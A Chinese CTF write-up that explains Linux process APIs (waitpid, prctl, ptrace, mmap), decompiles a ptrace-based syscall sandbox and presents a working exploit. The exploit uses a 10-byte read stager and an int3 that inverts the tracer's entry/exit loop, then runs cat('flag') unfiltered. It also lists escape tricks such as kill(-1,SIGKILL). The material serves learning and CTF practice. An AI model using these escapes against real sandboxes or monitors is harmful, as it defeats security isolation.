## 前置知识介绍

### waitpid函数

```c
pit_t waitpid(pid_t pid,int *status,int options);
```

参数**pid**：

1. pid>0时，只**等待进程ID等于pid的子进程**，不管其它已经有多少子进程运行结束退出了，只要指定的子进程还没有结束，waitpid就会一直等下去。
2. pid=-1时，等待任何一个子进程退出，没有任何限制，此时waitpid和wait的作用一模一样。
3. pid=0时，等待同一个进程组中的任何子进程，如果子进程已经加入了别的进程组，waitpid不会对它做任何理睬。
4. pid<-1时，等待一个指定进程组中的任何子进程，这个进程组的ID等于pid的绝对值。

参数**options**：

提供了一些额外的选项来控制waitpid，参数 option 可以为 0 或可以用"|"运算符把它们连接起来使用，比如：

ret=waitpid(-1,NULL,WNOHANG | WUNTRACED);

如果我们不想使用它们，也可以把options设为0，如：

ret=waitpid(-1,NULL,0);

WNOHANG 若pid指定的子进程没有结束，则waitpid()函数返回0，不予以等待。若结束，则返回该子进程的ID。

WUNTRACED 若子进程进入暂停状态，则马上返回，但子进程的结束状态不予以理会。WIFSTOPPED(status)宏确定返回值是否对应与一个暂停子进程。

参数**status**：

是一个整型指针。如果参数status的值不是NULL，wait就会把子进程退出时的状态取出并存入其中，这是一个整数值（int），指出了子进程是正常退出还是被非正常结束的（一个进程也可以被其他进程用信号结束，我们将在以后的文章中介绍），以及正常结束时的返回值，或被哪一个信号结束的等信息。由于这些信息被存放在一个整数的不同二进制位中，所以用常规的方法读取会非常麻烦，人们就设计了一套专门的宏（macro）来完成这项工作，下面我们来学习一下其中最常用的两个：

1，WIFEXITED(status) 这个宏用来指出子进程是否为正常退出的，如果是，它会返回一个非零值。

（请注意，虽然名字一样，这里的参数status并不同于wait唯一的参数--指向整数的指针status，而是那个指针所指向的整数，切记不要搞混了。）

2， WEXITSTATUS(status) 当WIFEXITED返回非零值时，我们可以用这个宏来提取子进程的返回值，如果子进程调用exit(5)退出，WEXITSTATUS(status) 就会返回5；如果子进程调用exit(7)，WEXITSTATUS(status)就会返回7。请注意，如果进程不是正常退出的，也就是说， WIFEXITED返回0，这个值就毫无意义。



### prctl函数

```c
int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
```

这个系统调用指令是为进程制定而设计的，明确的选择取决于**option**:

```c
PR_SET_PDEATHSIG :arg2作为处理器信号pdeath被输入，正如其名，如果父进程不能再用，进程接受这个信号。
 
PR_GET_DUMPABLE :返回处理器标志dumpable;
 
PR_SET_DUMPABLE :arg2作为处理器标志dumpable被输入。
 
PR_GET_NAME :返回调用进程的进程名字给参数arg2; （Since Linux2.6.9）
 
PR_SET_NAME :把参数arg2作为调用进程的经常名字。（SinceLinux 2.6.11）
 
PR_GET_TIMING :
 
PR_SET_TIMING :判定和修改进程计时模式,用于启用传统进程计时模式的
 
PR_TIMING_STATISTICAL，或用于启用基于时间戳的进程计时模式的
 
PR_TIMING_TIMESTAMP。
```



### ptrace

ptrace是使用信号来进行进程间通信，所以先复习下信号，可以使用`kill`向进程发送信号：

```shell
 1) SIGHUP	 2) SIGINT	 3) SIGQUIT	 4) SIGILL	 5) SIGTRAP
 6) SIGABRT	 7) SIGBUS	 8) SIGFPE	 9) SIGKILL	10) SIGUSR1
11) SIGSEGV	12) SIGUSR2	13) SIGPIPE	14) SIGALRM	15) SIGTERM
16) SIGSTKFLT	17) SIGCHLD	18) SIGCONT	19) SIGSTOP	20) SIGTSTP
21) SIGTTIN	22) SIGTTOU	23) SIGURG	24) SIGXCPU	25) SIGXFSZ
26) SIGVTALRM	27) SIGPROF	28) SIGWINCH	29) SIGIO	30) SIGPWR
31) SIGSYS	34) SIGRTMIN	35) SIGRTMIN+1	36) SIGRTMIN+2	37) SIGRTMIN+3
38) SIGRTMIN+4	39) SIGRTMIN+5	40) SIGRTMIN+6	41) SIGRTMIN+7	42) SIGRTMIN+8
43) SIGRTMIN+9	44) SIGRTMIN+10	45) SIGRTMIN+11	46) SIGRTMIN+12	47) SIGRTMIN+13
48) SIGRTMIN+14	49) SIGRTMIN+15	50) SIGRTMAX-14	51) SIGRTMAX-13	52) SIGRTMAX-12
53) SIGRTMAX-11	54) SIGRTMAX-10	55) SIGRTMAX-9	56) SIGRTMAX-8	57) SIGRTMAX-7
58) SIGRTMAX-6	59) SIGRTMAX-5	60) SIGRTMAX-4	61) SIGRTMAX-3	62) SIGRTMAX-2
63) SIGRTMAX-1	64) SIGRTMAX	
```

![image-20200801191543700](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20200801191543700.png)

linux下信号是软中断（即软件本身产生），也就是程序接收到信号后产生中断陷入内核，如果绑定了处理例程，内核就回到用户态调用此例程进行处理，否则根据信号的类型进行默认操作，如果在处理完毕后程序未终止就回到中断处继续执行。

这里给出一般使用single的example:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <string.h>
#include <signal.h>

void handler(int signum){
    printf("timeout~");
    exit(-1);
}
int main(){
        int buf[0x10];
        signal(SIGALRM,handler);    //绑定信号处理例程，当收到SIGALRM信号时，调>用handler处理
        alarm(0x06);                //设置定时器，当时间到了将会发送SIGALRM信号
        read(0,buf,0x10);
}

```

**ptrace函数详解**：

```c
long ptrace(enum __ptrace_request request,
            pid_t pid,
            void *addr,
            void *data);
```

参数request：请求ptrace执行的操作

参数pid：目标进程的ID

参数addr：目标进程的地址值

参数data：作用则根据request的不同而变化，如果需要向目标进程中写入数据，data存放的是需要写入的数据；如果从目标进程中读数据，data将存放返回的数据

request参数决定了CODE的行为以及后续的参数是如何被使用的，参数request的常用的值如下：

![img](https://img2018.cnblogs.com/blog/1414775/201906/1414775-20190618175009412-1155621983.png)

相对的poc如下：

子进程被父进程追踪，父进程在等待追踪结束后，重启子进程。当子进程被设置为tracee的时候，子进程除了SIGKILL之外的任何信号都会先被父进程（tracer）捕获，进行判断处理。tracer可以选择处理此信号，也可以在恢复tracee执行时将信号（可以为原来的信号，也可以是自己指定的其他信号）交给tracee。

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <stddef.h>

int main()
{
    pid_t pid = fork();
    if(pid){                                //父进程作为tracer
        int incall = 0;                     //由于syscall-stop会在进出系统调用时都暂停，这里简单的使用它只处理进入前的情况
        while(1){                           //循环处理
            int status;
            waitpid(pid,&status,0);         //等待获取tracee传来的信号
            if(WIFEXITED(status))break;     //当tracee的信号非EXIT时才处理，否则tracee退出自己也就不用再等待了
			//  PTRACE_PEEKUSER 来读取系统调用的参数
            long orig_rax = ptrace(PTRACE_PEEKUSER,pid,                   //从user结构里面取出原始rax的值
                                  offsetof(struct user,regs.orig_rax),0);
            long rsi = ptrace(PTRACE_PEEKUSER,pid,                        //当为write时，为buf起始地址
                                  offsetof(struct user,regs.rsi),0);
            long rdx = ptrace(PTRACE_PEEKUSER,pid,                        //当为write时，为长度
                                  offsetof(struct user,regs.rdx),0);
            if(incall){
                printf("orig_rax = %ld\n",orig_rax);                      //当进入系统调用时，输出rax，即输出系统调用号
                if(orig_rax==1){                        //当为write时
                    printf("write  ==>  ");           
                    for(int i=0;i<rdx;i++){   
                        int c = ptrace(PTRACE_PEEKDATA,pid,rsi+i,0);    //取出数据，虽然每次取一个word，但是为了简单就这样写
                        putchar(c&0xff);
                    }
                }
            }
            incall= ~incall;                //取反，其实用这种方法是有问题的，正常情况下系统调用进出因该是成对的，但是当系统调用被信号中断，将会破坏这种次序
            //ptrace(PTRACE_CONT,pid,0,0);   继续执行目标进程
            ptrace(PTRACE_SYSCALL,pid,0,0); //恢复tracee的执行，并让其在下次系统调用进入或退出时再次暂停
        }
    }else{                                  //子进程
        ptrace(PTRACE_TRACEME,0,0,0);       //表明想要被追踪，与父进程建立追踪关系
        execl("/bin/ls","ls",NULL);         //执行系统调用
    }
    return 0;
}
```

### 逃逸

未正确使用`ptrace`的沙箱环境是可以逃逸的。例如：

1. 未设置PTRACE_O_EXITKILL 杀掉tracer `kill(-1,SIGKILL)`
2. 未设置PTRACE_O_TRACECLONE类，使用类fork逃离
3. 利用上例方式判断系统调用时序，可通过在系统调用时中断它，来破坏时序 `alarm(1) sleep(2)`



### mmap函数

```c
void * mmap(void *start, size_t length, int prot , int flags, int fd, off_t offset)
```

参数**addr**：

指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。

参数**length**：

代表将文件中多大的部分映射到内存。

参数**prot**：

映射区域的保护方式。可以为以下几种方式的组合：

​	PROT_EXEC 映射区域可被执行

​	PROT_READ 映射区域可被读取

​	PROT_WRITE 映射区域可被写入

​	PROT_NONE 映射区域不能存取

参数**flags**：

影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。

MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此。

MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。

MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。

MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。

MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。

MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。

参数**offset**：

文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。

## 题目正文

先是fork子进程，然后子进程调用ptrace代表自己主动愿意被父进程监视。

```c
child_pid = fork();
  if ( child_pid < 0 )
  {
    v14 = __errno_location();
    strerror(*v14);
    __dprintf_chk(1LL, 1LL, "fork fail %s\n");
    return 1LL;
  }
  if ( !child_pid )                             // 子进程
  {
    prctl(1, 9LL);                              // arg2作为处理器信号pdeath被输入，正如其名，如果父进程不能再用，进程接受这个信号。此处是SIGKILL
                                                // 这里是prctl(PR_SET_PDEATHSIG, SIGKILL);
    if ( getppid() != 1 )
    {
      if ( ptrace(0, 0LL, 0LL, 0LL) )           // ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL)
      {
        v10 = __errno_location();
        strerror(*v10);
        __dprintf_chk(1LL, 1LL, "child traceme %s\n");
        _exit(1);
      }
      myself = getpid();
      kill(myself, 19);                         // kill(myself, SIGSTOP); 停止myself进程，直到SIGCONT信号
      exec_shellcode();
      _exit(0);
    }
```

exec_shellcode是一个子函数，do_while循环，一共写入10字节数据

```c
__int64 exec_shellcode()
{
  char *v0; // r12
  char *v1; // rbx
  char *v2; // rsi

  syscall(37LL, 20LL);                          // rax为37的sys_alarm，也就是隔20s发送SIGALRM给进程
  v0 = (char *)mmap(0LL, 10uLL, 7, 34, -1, 0LL);// 创建一个len为0x10的rwx空间
  v1 = v0;
  __dprintf_chk(1LL, 1LL, &unk_1484);
  do                                            // 逐字节写入10字节的数据
  {
    v2 = v1;
    if ( read(0, v1, 1uLL) != 1 )
      _exit(0);
    ++v1;
  }
  while ( v1 != v0 + 10 );
  ((void (__fastcall *)(_QWORD, char *))v0)(0LL, v2);
  return 0LL;
}
```

接着是父进程tracer设置的syscall过滤器

自己分析结合wp，得到：

+ `read`，`write`，`close`，`fstat`，`lseek`，`getpid` `exit`，`exit_group`可以直接执行
+ alarm必须rdi <=20
+ mmap，mprotect，munmap的rsi（len)最多为0x1000
+ open的rsi只有为0且rdi指向的最大长度为15的字符串有效地址，该字符串不包含'flag'，'proc'，'sys'

```c
bool __fastcall sub_DA0(unsigned int child_pid, _QWORD *a2)
{
  unsigned __int64 __rax; // rax
  __int64 v3; // rax
  __int64 __rdi; // rdx
  __int64 string_size; // r12
  __int64 v6; // rax
  __int128 string__size; // [rsp+0h] [rbp-38h]
  char v9; // [rsp+10h] [rbp-28h]
  unsigned __int64 v1; // [rsp+18h] [rbp-20h]

  v1 = __readfsqword(0x28u);                    // 此处推断[15]是rax，[14]是rdi，[13]是rsi，[12]是rdx
  __rax = a2[15];
  if ( __rax == 8 )                             // lseek
    goto return_0;
  if ( __rax <= 8 )
  {
    if ( __rax == 2 )                           // open
    {
      if ( !a2[13] )                            // 必须得rsi为0
      {
        __rdi = a2[14];
        v9 = 0;
        string__size = 0LL;
        string_size = ptrace(PTRACE_PEEKDATA, child_pid, __rdi, 0LL, (signed __int128)0LL, *(_QWORD *)&v9);
        v6 = ptrace(PTRACE_PEEKDATA, child_pid, a2[14] + 8LL, 0LL);
        if ( string_size != -1 && v6 != -1 )
        {
          *(_QWORD *)&string__size = string_size;
          *((_QWORD *)&string__size + 1) = v6;
          if ( strlen((const char *)&string__size) <= 0xF// 字符串长度最大为15
            && !strstr((const char *)&string__size, "flag")// 字符串里不能有'flag'和'proc'
            && !strstr(
                  (const char *)&string__size,
                  "proc") )
          {
            return strstr((const char *)&string__size, "sys") != 0LL;
          }
        }
      }
      goto return_1;
    }
    if ( __rax >= 2 && __rax != 3 && __rax != 5 )// rax先得<=8，且rax >=2 不等于3 不等于5，直接return 1
                                                // 此处的意思就是只允许使用close,fstat和lseek
    {
return_1:
      LOBYTE(v3) = 1;
      return v3;
    }
return_0:
    LOBYTE(v3) = 0;
    return v3;
  }
  if ( __rax == 37 )                            // alarm
  {
    LOBYTE(v3) = (unsigned __int64)(a2[14] - 1LL) > 0x13;
    return v3;
  }
  if ( __rax > 0x25 )
  {
    if ( __rax != 60 && __rax != 231 && __rax != 39 )// getpid,exit,exit_group
      goto return_1;
    goto return_0;
  }
  if ( __rax > 0xB )
    goto return_1;
  LOBYTE(v3) = a2[13] > 0x1000uLL;              // 判断rsi是否>0x1000
  return v3;
}
```

那么此题的大致思路就是，借用ptrace设置沙箱，过滤一些系统调用，然后输入shellcode，这里注意虽然它一次调用只能输入十字节的shellcode，但是.......正常人都知道，这肯定是不够的，那么我们就需要对其进行扩展，调用read，使其能够写更多的shellcode进去。

+ 首先需要设置rax = 0，此时根据该函数的汇编代码可以看出，在执行完毕10次read循环的时候，rax为1，所以这里就是需要我们xor rax,rax 或者sub rax,1
+ 其次是rdi，还是根据汇编代码观察，在一开始rdi就是0了，所以不需要设置
+ 接着是rsi，指向buf，根据汇编代码观察，mov rsi,rbx 每次循环add rbx,1且每次读入的都是一个数据。所以十次循环后rsi就刚好指向了下一次要读入的地址
+ 最后是rdx，读取长度，直接0x1000

接着就是来讲述漏洞点，先来看这个

```c
// simplified main tracer loop
while (1) {
    // wait for a syscall entry
    ptrace(PTRACE_SYSCALL, child_pid, 0); // 继续执行子进程，使得子进程在每次进行系统调用及结束一次系统调用时都会被内核停下来，此处是子进程进行系统调用
    waitpid(child_pid, &status, __WALL); // 等待获取子进程的信号
    
    ptrace(PTRACE_GETREGS, child_pid, 0, regs); // 获取寄存器的值
    if (check_syscall(child_pid, regs)) {
        // ALLOW SYSCALL
    } else {
        // BLOCK SYSCALL
    }

    // wait for a syscall exit
    ptrace(PTRACE_SYSCALL, child_pid, 0, 0); // 继续执行子进程，直到子进程结束一次系统调用，然后被暂停
    waitpid(child_pid, &status, __WALL); // 继续获取子进程的信号
}
```

如果我们有办法将其顺序颠倒呢？

```c
// simplified main tracer loop
while (1) {
    // wait for a syscall exit   注意此处，和上面不同
    ptrace(PTRACE_SYSCALL, child_pid, 0); // 继续执行子进程，使得子进程在每次进行系统调用及结束一次系统调用时都会被内核停下来，此处是子进程结束系统调用
    waitpid(child_pid, &status, __WALL); // 等待获取子进程的信号
    
    ptrace(PTRACE_GETREGS, child_pid, 0, regs); // 获取寄存器的值
    if (check_syscall(child_pid, regs)) {
        // ALLOW SYSCALL
    } else {
        // BLOCK SYSCALL
    }

    // wait for a syscall entry  注意此处，和上面不同
    ptrace(PTRACE_SYSCALL, child_pid, 0, 0); // 继续执行子进程，直到子进程开始一次系统调用，然后被暂停
    waitpid(child_pid, &status, __WALL); // 继续获取子进程的信号
}
```

如果我们的系统调用被父进程捕获是发送在下方的SYSCALL，会发生什么呢？我们的系统调用将不会被ptrace的tracer过滤，可以任意执行。这就是我们所需要的。这里给出exp

```python
# First 10 bytes of shellcode, used only to load the rest of the shellcode
shellcode = asm('''
push 1000
pop rdx
xor eax, eax
syscall
''', arch='amd64')

# Some nops to be sure there is no SIGSEV
# Invoke int3 to invert the main tracer loop
shellcode += asm('''
nop
nop
nop
nop
nop
nop
nop
mov rax, 8
int3
''', arch='amd64')

# And now just read the flag file :)
shellcode += asm(shellcraft.amd64.cat('flag'), arch='amd64')
```

该exp对应上述的捕获流程：

+ 第一次while：open开始信号发出，正常的被tracer捕获，tracee暂停，由tracer进行check，然后open结束信号发出被捕获，tracee继续运行
+ 第二次while：int 3信号被发出，这里注意一点，int 3信号不像其他系统调用，会有两次信号发出（开始和结束），它只会发出一次信号。（为什么只发出一次呢，个人猜测是因为它属于中断，结束的时候需要恢复上下文，这就表明eax之类的寄存器值都是调用前的值，程序没变过，所以不会被捕获到int 3结束）
+ 接上面第二次while：那么这时候，因为只有一次信号被捕获，所以程序流就执行了while的SYSCALL
+ 后续就执行cat flag，因为此时是从下方的SYSCALL执行的，不会有check，shellcode安全执行
+ 第三次while：这里的while就只执行了最开始的那一次SYSCALL，对应于open的结束信号。

真是magic的做法呢！

